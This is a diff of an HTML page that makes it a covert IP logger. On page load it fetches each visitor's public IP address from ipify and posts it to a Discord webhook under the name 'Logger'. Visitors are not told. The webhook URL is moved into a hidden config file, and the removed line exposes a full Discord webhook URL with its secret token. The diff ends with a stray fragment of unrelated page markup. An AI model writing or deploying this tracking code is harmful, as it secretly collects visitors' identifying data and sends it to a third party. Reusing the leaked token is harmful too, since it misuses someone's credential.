@@ -1,23 +1,29 @@
+<!DOCTYPE html>
 <html>
-    <body onload="sendMessage()">
+    <body onload="sendMessage();">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <script> $.getJSON("https://api.ipify.org?format=json", function(data) {$("#ip").html(data.ip);})</script>
+    <small><p id="ip"></p></small> 
+    <script src=".gitignore\config.js"></script>
 
     <script>
         function sendMessage(json) {
+        let ip = document.getElementById("ip").innerHTML;
         const request = new XMLHttpRequest();
-        request.open("POST", "https://discord.com/api/webhooks/1065671511756775455/H4hhUC2O_UJ3CneYQLI2BFEtiD8iJvqzmZJMJ6ZWesufX9vbGXssK67UdqDIOhcHFU8O");
+        request.open("POST", config.token);
 
         request.setRequestHeader('Content-type', 'application/json');
 
         const params = {
             username: "Logger",
             avatar_url: "",
-            content: "Somebody has visted the site!"
+            content: "**IP: **" + ip
         }
 
         request.send(JSON.stringify(params));
         }
     </script>
-        <script type="text/javascript" src=test.js></script>
 </html>
 
 <html lang="en" data-color-mode="dark" data-dark-theme="dark"><head>
